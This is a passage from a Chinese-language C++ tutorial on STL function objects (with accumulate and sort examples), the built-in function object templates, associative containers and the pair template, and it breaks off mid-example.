<p><code>()</code>是目数不限的运算符，因此重载为成员函数时，有多少个参数都可以。</p>
<p>average 是一个对象，average(3, 2, 3) 实际上就是 average.operator(3, 2, 3)，这使得 average 看上去像函数的名字，故称其为函数对象。</p>
<p><strong>函数对象应用实例1：在 accumulate 算法中的应用</strong></p>
<p><a href="http://c.biancheng.net/stl/">STL</a> 中有以下实现“累加”功能的算法（函数模板）：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">InIt</span>, <span class="title">class</span> <span class="title">T</span>, <span class="title">class</span> <span class="title">Pred</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">T</span> <span class="title">accumulate</span>(<span class="title">InIt</span> <span class="title">first</span>, <span class="title">InIt</span> <span class="title">last</span>, <span class="title">T</span> <span class="title">val</span>, <span class="title">Pred</span> <span class="title">op</span>);</span></span><br></pre></td></tr></table></figure>

<p>该模板的功能是对 [first, last) 中的每个迭代器 I 执行 val = op(val, *I)，返回最终的 val。在 Dev <a href="http://c.biancheng.net/cplus/">C++</a> 中，numeric 头文件中 accumulate 的源代码如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">InIt</span>, <span class="title">class</span> <span class="title">T</span>, <span class="title">class</span> <span class="title">Pred</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">T</span> <span class="title">accumulate</span>(<span class="title">InIt</span> <span class="title">first</span>, <span class="title">Init</span> <span class="title">last</span>, <span class="title">T</span> <span class="title">init</span>, <span class="title">Pred</span> <span class="title">op</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">for</span> (; first != last; ++first)</span><br><span class="line">        init = op(init, *first);</span><br><span class="line">    <span class="keyword">return</span> init;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>此模板被实例化后，<code>op(init, *first)</code>必须要有定义，则 op 只能是函数<a href="http://c.biancheng.net/c/80/">指针</a>或者函数对象。因此调用该 accmulate 模板时，形参 op 对应的实参只能是函数名、函数指针或者函数对象。</p>
<p>下面的程序通过 accumulate 模板求一个 vector 中元素的平方和，其中用到了函数对象。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;numeric&gt; //accumulate 在此头文件定义</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">PrintInterval</span>(<span class="title">T</span> <span class="title">first</span>, <span class="title">T</span> <span class="title">last</span>)</span></span><br><span class="line"><span class="class">&#123;</span> <span class="comment">//输出区间[first,last)中的元素</span></span><br><span class="line">    <span class="keyword">for</span> (; first != last; ++first)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; *first &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SumSquares</span><span class="params">(<span class="keyword">int</span> total, <span class="keyword">int</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> total + value * value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">SumPowers</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> power;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    SumPowers(<span class="keyword">int</span> p) :power(p) &#123; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">const</span> T <span class="title">operator</span><span class="params">()</span> <span class="params">(<span class="keyword">const</span> T &amp; total, <span class="keyword">const</span> T &amp; value)</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="comment">//计算 value的power次方，加到total上</span></span><br><span class="line">        T v = value;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; power - <span class="number">1</span>; ++i)</span><br><span class="line">            v = v * value;</span><br><span class="line">        <span class="keyword">return</span> total + v;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> SIZE = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> a1[] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span> &#125;;</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">v</span><span class="params">(a1, a1 + SIZE)</span></span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1) &quot;</span>; PrintInterval(v.begin(), v.end());</span><br><span class="line">    <span class="keyword">int</span> result = accumulate(v.begin(), v.end(), <span class="number">0</span>, SumSquares);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;2) 平方和：&quot;</span> &lt;&lt; result &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    result = accumulate(v.begin(), v.end(), <span class="number">0</span>, SumPowers&lt;<span class="keyword">int</span>&gt;(<span class="number">3</span>));</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;3) 立方和：&quot;</span> &lt;&lt; result &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    result = accumulate(v.begin(), v.end(), <span class="number">0</span>, SumPowers&lt;<span class="keyword">int</span>&gt;(<span class="number">4</span>));</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;4) 4次方和：&quot;</span> &lt;&lt; result;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序的输出结果如下：<br>1)1 2 3 4 5 6 7 8 9 10<br>2)平方和:385<br>3)立方和3025<br>4)4次方和:25333</p>
<p>第 37 行，第四个参数是 SumSquares 函数的名字。函数名字的类型是函数指针，因此本行将 accumulate 模板实例化后得到的模板函数定义如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accumulate</span><span class="params">(<span class="built_in">vector</span> &lt;<span class="keyword">int</span>&gt;::iterator first, <span class="built_in">vector</span> &lt;<span class="keyword">int</span>&gt;::iterator last, <span class="keyword">int</span> init, <span class="keyword">int</span>(*op)(<span class="keyword">int</span>, <span class="keyword">int</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (; first != last; ++first)</span><br><span class="line">        init = op(init, *first);</span><br><span class="line">    <span class="keyword">return</span> init;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>形参 op 是一个函数指针，而<code>op(init, *first)</code>就调用了指针 op 指向的函数，在第 37 行的情况下就是函数 SumSquares。</p>
<p>第 39 行，第四个参数是 SumPowers<int>(3)。SumPowers 是类模板的名字，SumPowers<int> 就是类的名字。类的名字后面跟着构造函数的参数列表，就代表一个临时对象。因此 SumPowers<int>(3) 就是一个 SumPowers<int> 类的临时对象。</int></int></int></int></p>
<p>编译器在编译此行时，会将 accumulate 模板实例化成以下函数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accumulate</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::iterator first, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::iterator last, <span class="keyword">int</span> init, SumPowers&lt;<span class="keyword">int</span>&gt; op)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (; first != last; ++first)</span><br><span class="line">        init = op(init, *first);</span><br><span class="line">    <span class="keyword">return</span> init;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>形参 op 是一个函数对象，而<code>op(init, *first)</code>等价于：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">op.<span class="keyword">operator</span>()(init, *first);</span><br></pre></td></tr></table></figure>

<p>即调用了 SumPowers<int> 类的 operator() 成员函数。</int></p>
<p>对比 SumPowers 和 SumSquares 可以发现，函数对象的 operator() 成员函数可以根据对象内部的不同状态执行不同操作，而普通函数就无法做到这一点。因此函数对象的功能比普通函数更强大。</p>
<p><strong>函数对象应用实例2：在sort算法中的应用</strong></p>
<p>STL 中的排序模板 sort 能将区间从小到大排序。sort 算法有两个版本。第一个版本的原型如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;class_Randlt&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(_Randlt first, _RandIt last)</span></span>;</span><br></pre></td></tr></table></figure>

<p>该模板可以用来将区间 [first, last) 中的元素从小到大排序，要求 first、last 是随机访问迭代器。元素比较大小是用<code>&lt;</code>进行的。如果表达式<code>a&lt;b</code>的值为 true，则 a 排在 b 前面；如果<code>a&lt;b</code>的值为 false，则 b 未必排在 a 前面，还要看<code>b&lt;a</code>是否成立，成立的话 b 才排在 a 前面。要使用这个版本的 sort 算法，待排序的对象必须能用<code>&lt;</code>运算符进行比较。</p>
<p>sort 算法第二个版本的原型如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;class_Randlt, <span class="class"><span class="keyword">class</span> <span class="title">Pred</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">sort</span>(_<span class="title">Randlt</span> <span class="title">first</span>, _<span class="title">RandIt</span> <span class="title">last</span>, <span class="title">Pred</span> <span class="title">op</span>);</span></span><br></pre></td></tr></table></figure>

<p>这个版本和第一个版本的差别在于，元素 a、b 比较大小是通过表达式<code>op(a, b)</code>进行的。如果该表达式的值为 true，则 a 比 b 小；如果该表达式的值为 false，也不能认为 b 比 a 小，还要看<code>op(b, a)</code>的值。总之，op 定义了元素比较大小的规则。下面是一个使用 sort 算法的例子。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;  //sort算法在此头文件中定义</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">Printlnterva1</span>(<span class="title">T</span> <span class="title">first</span>, <span class="title">T</span> <span class="title">last</span>)</span></span><br><span class="line"><span class="class">&#123;</span>  <span class="comment">//用以输出 [first, last) 区间中的元素</span></span><br><span class="line">    <span class="keyword">for</span> (; first != last; ++first)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; *first &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> v;</span><br><span class="line">    A(<span class="keyword">int</span> n) : v(n) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (<span class="keyword">const</span> A &amp; a1, <span class="keyword">const</span> A &amp; a2)</span><br><span class="line">&#123;  <span class="comment">//重载为 A 的 const 成员函数也可以，重载为非 const 成员函数在某些编译器上会出错</span></span><br><span class="line">    <span class="keyword">return</span> a1.v &lt; a2.v;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">GreaterA</span><span class="params">(<span class="keyword">const</span> A &amp; a1, <span class="keyword">const</span> A &amp; a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;  <span class="comment">//v值大的元素作为较小的数</span></span><br><span class="line">    <span class="keyword">return</span> a1.v &gt; a2.v;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LessA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span> <span class="params">(<span class="keyword">const</span> A &amp; a1, <span class="keyword">const</span> A &amp; a2)</span></span></span><br><span class="line"><span class="function">    </span>&#123;  <span class="comment">//v的个位数小的元素就作为较小的数</span></span><br><span class="line">        <span class="keyword">return</span> (a1.v % <span class="number">10</span>) &lt; (a2.v % <span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">ostream &amp; <span class="keyword">operator</span> &lt;&lt; (ostream &amp; o, <span class="keyword">const</span> A &amp; a)</span><br><span class="line">&#123;</span><br><span class="line">    o &lt;&lt; a.v;</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a1[<span class="number">4</span>] = &#123; <span class="number">5</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">1</span> &#125;;</span><br><span class="line">    A a2[<span class="number">5</span>] = &#123; <span class="number">13</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">16</span> &#125;;</span><br><span class="line">    sort(a1, a1 + <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1)&quot;</span>; Printlnterva1(a1, a1 + <span class="number">4</span>);  <span class="comment">//输出 1)1 2 4 5</span></span><br><span class="line">    sort(a2, a2 + <span class="number">5</span>);  <span class="comment">//按v的值从小到大排序</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;2)&quot;</span>; Printlnterva1(a2, a2 + <span class="number">5</span>);  <span class="comment">//输出 2)8 9 12 13 16</span></span><br><span class="line">    sort(a2, a2 + <span class="number">5</span>, GreaterA);  <span class="comment">//按v的值从大到小排序</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;3)&quot;</span>; Printlnterva1(a2, a2 + <span class="number">5</span>);  <span class="comment">//输出 3)16 13 12 9 8</span></span><br><span class="line">    sort(a2, a2 + <span class="number">5</span>, LessA());  <span class="comment">//按v的个位数从小到大排序</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;4)&quot;</span>; Printlnterva1(a2, a2 + <span class="number">5</span>);  <span class="comment">//输出 4)12 13 16 8 9</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译至第 45 行时，编译器将 sort 实例化得到的函数原型如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(A* first, A* last, <span class="keyword">bool</span> (*op)(<span class="keyword">const</span> A &amp;, <span class="keyword">const</span> A &amp;) )</span></span>;</span><br></pre></td></tr></table></figure>

<p>该函数在执行过程中，当要比较两个元素 a、b 的大小时，就是看 op(a, b) 和 op(b, a) 的返回值。本程序中 op 指向 GreaterA,因此就用 GreaterA 定义的规则来比较大小。</p>
<p>编译至第 47 行时，编译器将 sort 实例化得到的函数原型如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">( A* first, A* last, LessA op)</span></span>;</span><br></pre></td></tr></table></figure>

<p>该函数在执行过程中，当要比较两个元素 a、b 的大小时，就是看 op(a, b) 和 op(b, a) 的返回值。本程序中，op(a, b) 等价于 op.opeartor(a, b)，因此就用 LessA 定义的规则来比较大小。</p>
<p>STL 中定义了一些函数对象类模板，都位于头文件 functional 中。例如，greater 模板的源代码如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">greater</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">const</span> T&amp; x, <span class="keyword">const</span> T&amp; y)</span> <span class="keyword">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x &gt; y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>假设有以下数组：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a[<span class="number">4</span>] = &#123;<span class="number">3</span>, <span class="number">5</span>, <span class="number">34</span>, <span class="number">8</span>&#125;;</span><br></pre></td></tr></table></figure>

<p>要将该数组从大到小排序，则只需写：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">sort( a, a+<span class="number">4</span>, greater&lt;<span class="keyword">int</span>&gt;() );</span><br></pre></td></tr></table></figure>

<p>要使用 greater 模板，须确保<code>&gt;</code>运算符本来就有定义，或经过了适当的重载。</p>
<p>list 容器的 sort 成员能将元素从小到大排序。它也有两个版本：一个是没有参数的函数，比较大小用<code>&lt;</code>运算符；另一个是函数模板，原型如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">Pred</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">sort</span>(<span class="title">Pred</span> <span class="title">op</span>);</span></span><br></pre></td></tr></table></figure>

<p>sort 函数允许自定义比较大小的规则，即 op(x, y) 为真就认为 x 比 y 小。例如，假设有：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; lst;</span><br></pre></td></tr></table></figure>

<p>如果希望将 lst 中的元素按其整数数值从大到小排序，只需写：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">lst.sort( greater&lt;<span class="keyword">int</span>&gt;() );</span><br></pre></td></tr></table></figure>

<p>在使用关联容器和许多算法时，都可以用函数对象来定义比较大小的规则，以及其他一些规则和操作。</p>
<p><strong>STL 中的函数对象类模板</strong></p>
<p>STL 中有一些函数对象类模板，如表 1 所示。</p>
<table>
<thead>
<tr>
<th>函数对象类模板</th>
<th>成员函数 T operator ( const T &amp; x, const T &amp; y) 的功能</th>
</tr>
</thead>
<tbody><tr>
<td>plus <T></T></td>
<td>return x + y;</td>
</tr>
<tr>
<td>minus &lt; &gt;</td>
<td>return x - y;</td>
</tr>
<tr>
<td>multiplies <T></T></td>
<td>return x * y;</td>
</tr>
<tr>
<td>divides <T></T></td>
<td>return x / y;</td>
</tr>
<tr>
<td>modulus <T></T></td>
<td>return x % y;</td>
</tr>
<tr>
<td></td>
<td>成员函数 bool operator( const T &amp; x, const T &amp; y) 的功能</td>
</tr>
<tr>
<td>equal_to <T></T></td>
<td>return x == y;</td>
</tr>
<tr>
<td>not_equal_to <T></T></td>
<td>return x! = y;</td>
</tr>
<tr>
<td>greater <T></T></td>
<td>return x &gt; y;</td>
</tr>
<tr>
<td>less <T></T></td>
<td>return x &lt; y;</td>
</tr>
<tr>
<td>greater_equal <T></T></td>
<td>return x &gt; = y;</td>
</tr>
<tr>
<td>less_equal <T></T></td>
<td>return x &lt;= y;</td>
</tr>
<tr>
<td>logical_and <T></T></td>
<td>return x &amp;&amp; y;</td>
</tr>
<tr>
<td>logical_or <T></T></td>
<td>return x || y;</td>
</tr>
<tr>
<td></td>
<td>成员函数 T operator( const T &amp; x) 的功能</td>
</tr>
<tr>
<td>negate <T></T></td>
<td>return - x;</td>
</tr>
<tr>
<td></td>
<td>成员函数 bool operator( const T &amp; x) 的功能</td>
</tr>
<tr>
<td>logical_not <T></T></td>
<td>return ! x;</td>
</tr>
</tbody></table>
<p>例如，如果要求两个 double 型变量 x、y 的乘积，可以写：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">multiplies&lt;<span class="keyword">double</span>&gt; () (x, y)</span><br></pre></td></tr></table></figure>


<p>less 是 STL 中最常用的函数对象类模板，其定义如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;class_Tp&gt;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">less</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span> <span class="params">(const_Tp &amp; __x, const_Tp &amp; __y)</span> <span class="keyword">const</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> __x &lt; __y; &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>要判断两个 int 变量 x、y 中 x 是否比 y 小，可以写：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( less&lt;<span class="keyword">int</span>&gt;()(x, y) ) &#123; ... &#125;</span><br></pre></td></tr></table></figure>



<p><strong>引入函数对象后 STL 中的“大”、“小”和“相等”概念</strong></p>
<p>前面提到过，默认情况下，STL 中的容器和算法比较元素的大小是通过<code>&lt;</code>运算符进行的。通过 10.3.4 节可知，sort 和 list::sort 都可以通过一个函数对象或函数自定义比较元素大小的规则。例如以下的 sort 版本：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;class_RandIt, <span class="class"><span class="keyword">class</span> <span class="title">Pred</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">sort</span>(_<span class="title">RandIt</span> <span class="title">first</span>, _<span class="title">RandIt</span> <span class="title">last</span>, <span class="title">Pred</span> <span class="title">op</span>);</span></span><br></pre></td></tr></table></figure>

<p>实际调用 sort 时，和 op 对应的实参可以是一个函数对象或者函数的名字。sort 在执行过程中用 op(x, y) 比较 x 和 y 的大小，因此可以将 op 称为自定义的“比较器”。</p>
<p>关联容器中的元素是从小到大排序的。使用关联容器时，也可以用自定义的比较器取代<code>&lt;</code>运算符，以规定元素之间的大小关系。STL 中还有许多算法都可以自定义比较器。在自定义比较器 op 的情况下，以下三种说法是等价的：</p>
<ul>
<li>x 小于 y。</li>
<li>op(x, y) 的返回值为 true。</li>
<li>y 大于 x。</li>
</ul>
<p>同样地，对关联容器的 find 和 count 成员函数以及其他一些在有序区间上的 STL 算法而言，在自定义比较器 op 的情况下，<code>x和y相等</code>与<code>op(x, y)和op(y, x)都为假</code>是等价的。</p>
<h4 id="C-关联容器，STL关联容器"><a href="#C-关联容器，STL关联容器" class="headerlink" title="C++关联容器，STL关联容器"></a>C++关联容器，STL关联容器</h4><p>关联容器内部的元素都是排好序的，有以下四种。</p>
<ul>
<li>set：排好序的集合，不允许有相同元素。</li>
<li>multiset：排好序的集合，允许有相同元素。</li>
<li>map：每个元素都分为关键字和值两部分，容器中的元素是按关键字排序的。不允许有多个元素的关键字相同。</li>
<li>multimap：和 map 类似，差别在于元素的关键字可以相同。</li>
</ul>
<p>不能修改 set 或 multiset 容器中元素的值。因为元素被修改后，容器并不会自动重新调整顺序，于是容器的有序性就会被破坏，再在其上进行查找等操作就会得到错误的结果。因此，如果要修改 set 或 multiset 容器中某个元素的值，正确的做法是先删除该元素，再插入新元素。</p>
<p>同理，也不能修改 map 和 multimap 容器中元素的关键字。</p>
<p>关联容器内部的元素或关键字之间比较大小可以用<code>&lt;</code>运算符，也可以用自定义的比较器。因为有序，所以在关联容器上进行查找的速度较快。</p>
<p>使用关联容器的目的也就在于快速查找。当一个元素被插入关联容器时，该元素会和已有的元素进行比较，最终被插入一个合适的位置。</p>
<p>在关联容器中查找元素和插入元素的时间复杂度都是 O(log(n))。从 begin() 到 end() 遍历整个关联容器，就是从小到大遍历整个容器。</p>
<p>在排好序的 vector 和 deque 上进行折半查找，时间复杂度也可以是 O(log(n))。但是，对于插入、删除和查询交替进行的情况，使用 vector 和 deque 的效率不高。因为它们上面的插入和删除操作会引起元素的移动，时间复杂度是 O(n)。</p>
<p>关联容器一般是用平衡二叉树实现的。平衡二叉树的原理属于“<a href="http://c.biancheng.net/data_structure/">数据结构</a>”课程的内容，本教程不做介绍。</p>
<p>除了所有容器共有的成员函数外，关联容器还具有以下成员函数：</p>
<ul>
<li>find：查找某个值。</li>
<li>lower_bound：查找某个下界。</li>
<li>upper_bound：查找某个上界。</li>
<li>equal_range：同时查找上界和下界。</li>
<li>count：计算等于某个值的元素个数。</li>
<li>insert：插人一个元素或一个区间。</li>
</ul>
<h4 id="C-pair类模板，STL-pair类模板"><a href="#C-pair类模板，STL-pair类模板" class="headerlink" title="C++ pair类模板，STL pair类模板"></a>C++ pair类模板，STL pair类模板</h4><p>在学习关联容器之前，首先要了解 <a href="http://c.biancheng.net/stl/">STL</a> 中的 pair 类模板，因为关联容器的一些成员函数的返回值是 pair 对象，而且 map 和 multimap 容器中的元素都是 pair 对象。pair 的定义如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;class_Tl, class_T2&gt;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pair</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _T1 first;</span><br><span class="line">    _T2 second;</span><br><span class="line">    <span class="built_in">pair</span>(): first(), second() &#123;&#125;  <span class="comment">//用无参构造函数初始化 first 和 second</span></span><br><span class="line">    <span class="built_in">pair</span>(<span class="keyword">const</span> _T1 &amp;__a, <span class="keyword">const</span> _T2 &amp;__b): first(__a), second(__b) &#123;&#125;</span><br><span class="line">    <span class="keyword">template</span> &lt;class_U1, class_U2&gt;</span><br><span class="line">    <span class="built_in">pair</span>(<span class="keyword">const</span> <span class="built_in">pair</span> &lt;_U1, _U2&gt; &amp;__p): first(__p.first), second(__p.second) &#123;&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>pair实例化出来的类都有两个成员变量，一个是 first, 一个是 second。</p>
<p>STL 中还有一个函数模板 make_pair，其功能是生成一个 pair 模板类对象。make_pair 的源代码如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T1</span>, <span class="title">class</span> <span class="title">T2</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">pair</span>&lt;T1, T2 &gt; <span class="title">make_pair</span>(<span class="title">T1</span> <span class="title">x</span>, <span class="title">T2</span> <span class="title">y</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">return</span> ( <span class="built_in">pair</span>&lt;T1, T2&gt; (x, y) );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面的程序演示了 pair 和 make_pair 的用法。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">pair</span>&lt;<span class="keyword">int</span>,<span class="keyword">double</span>&gt; p1;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; p1.first &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; p1.second &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//输出  0,0   </span></span><br><span class="line">    pair&lt;string,int&gt; p2(&quot;this&quot;,20);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; p2.first &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; p2.second &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//输出  this,20</span></span><br><span class="line">    pair&lt;int,int&gt; p3(pair&lt;char,char&gt;(&#x27;a&#x27;,&#x27;b&#x27;));</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; p3.first &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; p3.second &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//输出  97,98</span></span><br><span class="line">    <span class="built_in">pair</span>&lt;<span class="keyword">int</span>,<span class="built_in">string</span>&gt; p4 = <span class="built_in">make_pair</span>(<span class="number">200</span>,<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; p4.first &lt;&lt; <span 